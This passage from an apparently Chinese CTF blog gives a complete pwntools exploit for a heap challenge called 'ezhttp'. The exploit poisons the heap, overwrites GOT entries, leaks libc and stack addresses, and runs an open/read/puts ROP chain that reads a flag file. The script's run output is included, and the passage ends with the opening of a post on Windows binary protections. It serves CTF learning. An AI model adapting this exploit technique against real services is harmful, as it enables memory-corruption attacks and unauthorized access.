class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: archlinux</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;ezhttp&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;./ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	<span class="comment">#os.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)</span></span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;183.129.189.62&quot;</span></span><br><span class="line">server_port = <span class="number">62002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">d</span>):</span></span><br><span class="line">	print(d)</span><br><span class="line">	p =  <span class="string">b&#x27;POST /create HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;Cookie: user=admin \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;token: \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;content=&#x27;</span></span><br><span class="line">	p += d</span><br><span class="line">	sa(<span class="string">&#x27;======= Send Http packet to me: ========\n&#x27;</span>, p)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	p =  <span class="string">b&#x27;POST /del HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;Cookie: user=admin \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;token: \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;index=&#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">	sa(<span class="string">&#x27;======= Send Http packet to me: ========\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">i, d</span>):</span></span><br><span class="line">	p =  <span class="string">b&#x27;POST /edit HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;Cookie: user=admin \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;token: \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;index=&#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">	p += <span class="string">b&#x27;&amp;content=&#x27;</span> + d + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	sa(<span class="string">&#x27;======= Send Http packet to me: ========\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span>) <span class="comment"># 0</span></span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(ru(<span class="string">&#x27;&quot;&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">	offset = (<span class="number">0x55555575c260</span> - <span class="number">0x555555554000</span>)</span><br><span class="line">	li(<span class="string">&#x27;offset: &#x27;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">	elf_base = leak - offset</span><br><span class="line">	p_addr = elf_base + <span class="number">0x203120</span></span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	li(<span class="string">&#x27;elf_base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	li(<span class="string">&#x27;attack to p_addr&#x27;</span>)	</span><br><span class="line">	<span class="comment"># attack to p_addr + 0x10 set chunk 1 -&gt; free_got</span></span><br><span class="line">	ad(p64(p_addr + <span class="number">0x10</span>)) <span class="comment"># 1</span></span><br><span class="line">	ad(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span>) <span class="comment"># 2</span></span><br><span class="line">	free_got = elf_base + elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;free_got: &#x27;</span> + <span class="built_in">hex</span>(free_got))</span><br><span class="line">	ad(p64(free_got)) <span class="comment"># 3</span></span><br><span class="line">	li(<span class="string">&#x27;p_addr: &#x27;</span> + <span class="built_in">hex</span>(p_addr))</span><br><span class="line">	</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	li(<span class="string">&#x27;modify free_got as puts plt&#x27;</span>)</span><br><span class="line">	md(<span class="number">1</span>, p64(elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>])[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;attack to p_addr set chunk2 as atoi got&#x27;</span>)</span><br><span class="line">	ad(p64(p_addr + <span class="number">0x20</span>)) <span class="comment"># 1</span></span><br><span class="line">	ad(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span>) <span class="comment"># 2</span></span><br><span class="line">	ad(p64(elf_base + elf.got[<span class="string">&#x27;atoi&#x27;</span>])) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">	libc.address = libc_base</span><br><span class="line">	libc_environ = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">	exit_hook = libc_base + + (<span class="number">0x7ffff7ffdf68</span> - <span class="number">0x7ffff7a23000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_atoi: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	li(<span class="string">&#x27;environ: &#x27;</span> + <span class="built_in">hex</span>(libc_environ))</span><br><span class="line">	li(<span class="string">&#x27;_rtld_lock_unlock_recursive : &#x27;</span> + <span class="built_in">hex</span>(exit_hook))</span><br><span class="line">	<span class="comment">#md(3, p64(libc_environ)[0:6])</span></span><br><span class="line">	<span class="comment">#rm(1)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># recovery chunk 2</span></span><br><span class="line">	md(<span class="number">3</span>, p64(p_addr + <span class="number">0x28</span>)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	md(<span class="number">1</span>, <span class="string">b&#x27;\x08&#x27;</span>)</span><br><span class="line">	md(<span class="number">3</span>, p64(p_addr + <span class="number">0x20</span>)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	md(<span class="number">1</span>, p64(libc_environ)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak stack</span></span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	stack_input = leak - (<span class="number">0x7fffffffede8</span> - <span class="number">0x7fffffffdce0</span>)</span><br><span class="line">	stack_main = leak</span><br><span class="line">	li(<span class="string">&#x27;stack input: &#x27;</span> + <span class="built_in">hex</span>(stack_input))</span><br><span class="line">	li(<span class="string">&#x27;stack main: &#x27;</span> + <span class="built_in">hex</span>(stack_main))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># modify exit got as loop input</span></span><br><span class="line">	md(<span class="number">3</span>, p64(elf_base + elf.got[<span class="string">&#x27;exit&#x27;</span>])[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	ret_n = elf_base +  <span class="number">0x18EB</span> <span class="comment"># set run loop again</span></span><br><span class="line">	md(<span class="number">1</span>, p64(ret_n)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	</span><br><span class="line">	pop4_ret = libc_base + <span class="number">0x21457</span></span><br><span class="line">	pop_rsp_ret = libc_base + <span class="number">0x3960</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p64(stack_input + <span class="number">0x10</span>)</span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># clean: rubish</span></span><br><span class="line">	sla(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;AAAAAAA\x00&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;AAAAAA\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;jmp to: &#x27;</span> + <span class="built_in">hex</span>(pop4_ret))</span><br><span class="line">	md(<span class="number">1</span>, p64(pop4_ret)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	<span class="comment"># rop chain</span></span><br><span class="line">	p = p64(pop_rsp_ret)</span><br><span class="line">	p += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">	libc_read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	libc_open = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	libc_puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x2154d</span></span><br><span class="line">	pop_rdx_rsi = libc_base + <span class="number">0xfe669</span></span><br><span class="line">	pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">	flag_addr = stack_input + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># ret to here</span></span><br><span class="line">	<span class="comment"># open</span></span><br><span class="line">	p += p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">	p += p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(libc_open)</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	p += p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">	p += p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(flag_addr + <span class="number">0x10</span>)</span><br><span class="line">	p += p64(libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	p += p64(pop_rdi) + p64(flag_addr + <span class="number">0x10</span>)</span><br><span class="line">	p += p64(libc_puts)</span><br><span class="line"></span><br><span class="line">	p = p.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	p += <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line">	li(<span class="string">&#x27;flag here: \n&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;ok&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>



<p>输出:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">logan@arch:~/share/xh/pwn2 » ls</span><br><span class="line">dm  exp  ezhttp  ezhttp.i64  ezhttp.o  flag  ld-linux-x86-64.so.2  libc.so.6  p</span><br><span class="line">logan@arch:~/share/xh/pwn2 » ./exp</span><br><span class="line">[*] <span class="string">&#x27;/home/logan/share/xh/pwn2/ezhttp&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/home/logan/share/xh/pwn2/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;/home/logan/share/xh/pwn2/ezhttp&#x27;</span>: pid 22554</span><br><span class="line">[*] exploit...</span><br><span class="line">b<span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">[*] offset: 0x208260</span><br><span class="line">[*] leak: 0x55555575c260</span><br><span class="line">[*] elf_base: 0x555555554000</span><br><span class="line">[*] attack to p_addr</span><br><span class="line">b<span class="string">&#x27;0quUUU\x00\x00&#x27;</span></span><br><span class="line">b<span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">[*] free_got: 0x555555757018</span><br><span class="line">b<span class="string">&#x27;\x18puUUU\x00\x00&#x27;</span></span><br><span class="line">[*] p_addr: 0x555555757120</span><br><span class="line">[*] modify free_got as puts plt</span><br><span class="line">[*] attack to p_addr <span class="built_in">set</span> chunk2 as atoi got</span><br><span class="line">b<span class="string">&#x27;@quUUU\x00\x00&#x27;</span></span><br><span class="line">b<span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">b<span class="string">&#x27;\xb0puUUU\x00\x00&#x27;</span></span><br><span class="line">[*] libc_atoi: 0x7ffff7a58ac0</span><br><span class="line">[*] libc_base: 0x7ffff7a23000</span><br><span class="line">[*] environ: 0x7ffff7dd5098</span><br><span class="line">[*] _rtld_lock_unlock_recursive : 0x7ffff7ffdf68</span><br><span class="line">[*] stack input: 0x7fffffffdd20</span><br><span class="line">[*] stack main: 0x7fffffffee28</span><br><span class="line">[*] jmp to: 0x7ffff7a44457</span><br><span class="line">[*] flag here: </span><br><span class="line">    </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="string">&quot;,&quot;</span>err_info<span class="string">&quot;:&quot;</span>Method not allowed<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">======= Server return: =======</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">HTTP/1.1 405 Method Not Allowed</span></span><br><span class="line"><span class="string">Server: H-Server</span></span><br><span class="line"><span class="string">Date: Sun, 01 Feb 2222 00:00:00 GMT</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 47</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;</span>status<span class="string">&quot;:&quot;</span>ok<span class="string">&quot;,&quot;</span>err_info<span class="string">&quot;:&quot;</span>Method not allowed<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">======= Server return: =======</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">HTTP/1.1 405 Method Not Allowed</span></span><br><span class="line"><span class="string">Server: H-Server</span></span><br><span class="line"><span class="string">Date: Sun, 01 Feb 2222 00:00:00 GMT</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 47</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;</span>status<span class="string">&quot;:&quot;</span>ok<span class="string">&quot;,&quot;</span>err_info<span class="string">&quot;:&quot;</span>Method not allowed<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">======= Server return: =======</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Server: H-Server</span></span><br><span class="line"><span class="string">Date: Sun, 01 Feb 2222 00:00:00 GMT</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;</span>status<span class="string">&quot;:&quot;</span>ok<span class="string">&quot;,&quot;</span>err_info<span class="string">&quot;:&quot;</span>Edit success!<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">======= Send Http packet to me: ========</span></span><br><span class="line"><span class="string">======= Server return: =======</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">HTTP/1.1 405 Method Not Allowed</span></span><br><span class="line"><span class="string">Server: H-Server</span></span><br><span class="line"><span class="string">Date: Sun, 01 Feb 2222 00:00:00 GMT</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 47</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;</span>status<span class="string">&quot;:&quot;</span>ok<span class="string">&quot;,&quot;</span>err_info<span class="string">&quot;:&quot;</span>Method not allowed<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">======= Server return: =======</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">HTTP/1.1 401 Unauthorized</span></span><br><span class="line"><span class="string">Server: H-Server</span></span><br><span class="line"><span class="string">Date: Sun, 01 Feb 2222 00:00:00 GMT</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 43</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;</span>status<span class="string">&quot;:&quot;</span>ok<span class="string">&quot;,&quot;</span>err_info<span class="string">&quot;:&quot;</span>You not login!<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">flag&#123;test_flag&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br></pre></td></tr></table></figure>



<h2 id="ezhttp-思路2"><a href="#ezhttp-思路2" class="headerlink" title="ezhttp 思路2"></a>ezhttp 思路2</h2><p>第一种方法虽然可行, 但是爆破几率实在太低 1/ 4096.</p>
<p>那我们就采用法二,  打通几率 1 / 16, 通过修改<code>_IO_2_1_stdout</code>来进行泄漏.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/08/xh-2020/" data-id="ckhemv8520062wdcm3nnse32u" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-windows-pwn-0" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/02/windows-pwn-0/" class="article-date">
  <time datetime="2020-10-02T04:02:32.000Z" itemprop="datePublished">2020-10-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/02/windows-pwn-0/">windows-pwn-0</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Windows-Pwn-0x00-基本知识"><a href="#Windows-Pwn-0x00-基本知识" class="headerlink" title="Windows Pwn 0x00 (基本知识)"></a>Windows Pwn 0x00 (基本知识)</h1><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>​    _cdecl</p>
<p>​    _stdcall</p>
<p>​    _fastcall</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p>相关保护的开启都依赖于编译器的编译方式, 不同的编译器, 开启的程序保护机制也有所不同.</p>
<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a><code>ASLR</code></h3><p><code>ASLR</code>保护指的是地址随机化技术(<code>Address Space Layout Randomization</code>)，这项技术将在程序启动时将<code>DLL</code>随机的加载到内存中的位置，这将缓解恶意程序的加载。<code>ASLR</code>技术自<code>Windows 10</code>开始已经在系统中被配置为默认启用,。</p>
<h3 id="High-Entropy-VA"><a href="#High-Entropy-VA" class="headerlink" title="High Entropy VA"></a><code>High Entropy VA</code></h3><p>这个保护被称为高熵64位地址空间布局随机化，一旦开启，表示此程序的地址随机化的取值空间为<code>64 bit</code>，这会导致攻击者更难去推测随机化后的地址。</p>
<h3 id="Force-Integrity"><a href="#Force-Integrity" class="headerlink" title="Force Integrity"></a><code>Force Integrity</code></h3><p>这个保护被称为强制签名保护，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被阻止运行。</p>
<h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a><code>Isolation</code></h3><p>隔离保护, 开启之后, 表示此 程序加载时需要验证其中的签名,如果签名不正确,此程序会被阻止运行</p>
<h3 id="NX-DEP-PAE"><a href="#NX-DEP-PAE" class="headerlink" title="NX/DEP/PAE"></a><code>NX/DEP/PAE</code></h3><p>NX保护指的是内存页不可执行, 这项技术是一项系统级别内存保护的功能， 使得操作系统能够将一页或多页内存标记为不可执行，防止被标记为不可执行的内存页的代码不可执行。</p>
<p>DEP:(Data Execution Prevention)</p>
<p>PAE:(Physical Address Extension)</p>
